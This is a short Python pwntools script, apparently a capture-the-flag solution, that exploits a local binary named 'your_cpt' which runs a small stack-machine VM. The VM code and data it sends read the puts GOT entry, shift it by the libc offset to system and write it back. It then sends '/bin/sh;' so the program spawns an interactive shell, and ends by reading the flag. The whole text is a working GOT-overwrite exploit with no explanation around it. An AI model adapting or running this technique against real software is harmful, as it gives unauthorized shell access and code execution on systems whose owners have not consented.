from pwn import *

#io = remote("", )
io = process("./your_cpt")

elf = ELF("./your_cpt")
libc = ELF("./libc.so.6")

puts_got = elf.got["puts"]
system_addr = libc.sym["system"]
puts_addr = libc.sym["puts"]

def make_data(d):
    return " ".join([str(x) for x in d])

def make_code(d):
    return " ".join(d)

code = ["push", "push", "push", "load", "push", "sub", "div", "add", "load"]
data = [1, 8, -5, puts_got]

code += ["push", "add"]
data += [system_addr - puts_addr]

code += ["push", "push", "push", "load", "push", "sub", "div", "add", "save"]
data += [1, 8, -6, puts_got]

io.recvuntil("name?\n")
io.sendline("/bin/sh;")
io.recvuntil(":\n")
io.sendline(make_code(code))
io.recvuntil(":")
io.sendline(make_data(data))
io.recvuntil("Doing....")
io.interactive()
io.sendline("cat flag")
